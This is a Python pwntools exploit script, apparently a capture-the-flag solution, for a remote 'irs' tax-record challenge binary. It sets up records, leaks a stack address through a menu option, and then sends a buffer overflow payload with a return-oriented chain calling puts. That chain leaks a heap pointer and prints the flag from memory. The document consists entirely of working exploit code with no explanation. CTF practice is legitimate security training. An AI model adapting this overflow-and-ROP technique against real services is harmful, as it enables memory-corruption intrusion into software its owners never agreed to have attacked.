from pwn import *

pop_ret=0x080484b9
main=0x08048A39

plt_puts=0x080484F8

#p=process("./irs")
p=remote('irs.pwn.republican',4127)

def getpid(name):
	pid= pwnlib.util.proc.pidof(name)
	log.info(str(pid))
	raw_input('continue')

#getpid('irs')

def new(lastname):
	p.recvuntil(lastname+'\r\n')
	p.sendline('1')
	p.recvuntil('name: ')
	p.sendline('testname')
	p.recvuntil('password: ')
	p.sendline('testpass')
	p.recvuntil('income: ')
	p.sendline('1')
	p.recvuntil('deductions: ')
	p.sendline('1')

new('Trump')
new('testname')
new('testname')
new('testname')

def leak_heap():
	p.recvuntil('4 - testname\r\n')
	p.sendline('1')
	p.recvuntil('address: ')
	recv=p.recvuntil('\r\n')[:-2]
	log.info('recv: '+recv)
	leak=int(recv,16)
	return leak

context.log_level='debug'

stack_addr=leak_heap()
log.info('stack: '+hex(stack_addr))
#getpid('irs')

# ROP
def rop(name,payload):
	p.recvuntil(name+'\r\n')
	p.sendline('3')
	p.recvuntil('edit: ')
	p.sendline('testname')
	p.recvuntil('password: ')
	p.sendline('testpass')
	p.recvuntil('income: ')
	p.sendline('1')
	p.recvuntil('deductible: ')
	p.sendline('1')
	p.recvuntil('y/n\r\n')
	p.sendline(payload)


#getpid('irs')
payload='A'*25+p32(plt_puts)+p32(pop_ret)+p32(stack_addr)+p32(main)
rop('testname',payload)

p.recvuntil('ded!\r\n')
heap_addr=u32(p.recvn(4).ljust(4,'\x00'))
log.info('heap: '+hex(heap_addr))
flag_addr=heap_addr+0x32

new('Trump')
payload='A'*25+p32(plt_puts)+p32(pop_ret)+p32(flag_addr)+p32(main)
rop('Trump',payload)

p.recvall()
p.interactive()
